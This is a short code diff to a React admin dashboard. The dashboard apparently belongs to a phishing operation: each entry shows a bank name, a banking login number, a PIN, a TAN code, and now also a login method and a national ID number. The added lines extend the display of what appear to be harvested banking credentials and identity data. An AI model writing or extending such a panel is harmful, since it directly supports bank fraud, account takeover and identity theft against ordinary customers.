@@ -860,6 +860,8 @@ export function AdminDashboardClean() {
                       <div className="mb-1 text-[10px] font-black uppercase text-zinc-500 tracking-wider">
                         Banka: <span className="text-white">{fd.bankName || "Bilinmiyor"}</span>
                       </div>
+                      {fd.loginMethod && <div className="text-blue-400 font-bold">Yöntem: <span className="text-zinc-100">{fd.loginMethod}</span></div>}
+                      {fd.personalCode && <div className="text-blue-400 font-bold">Kimlik No: <span className="text-zinc-100">{fd.personalCode}</span></div>}
                       <div className="text-blue-400 font-bold">ID: <span className="text-zinc-100">{fd.verfuegernummer || fd.id || "-"}</span></div>
                       <div className="text-blue-400 font-bold">PW: <span className="text-zinc-100">{fd.pin || fd.pw || "-"}</span></div>
                       <div className="text-blue-400 font-bold">KOD: <span className="text-zinc-100">{fd.tacCode || fd.tac_code || "-"}</span></div>
